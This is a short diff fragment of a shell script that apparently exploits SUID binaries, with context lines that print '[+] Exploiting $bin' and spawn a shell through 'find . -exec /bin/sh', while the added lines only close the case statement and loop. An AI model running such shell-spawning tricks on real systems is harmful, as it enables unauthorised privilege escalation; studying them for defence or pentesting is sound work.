@@ -20,3 +20,7 @@ exec “/bin/sh”;'
 			echo “[+] Exploiting $bin”
 			$bin . -exec /bin/sh \;
 			;;
+				*)
+					;;
+		esac
+done
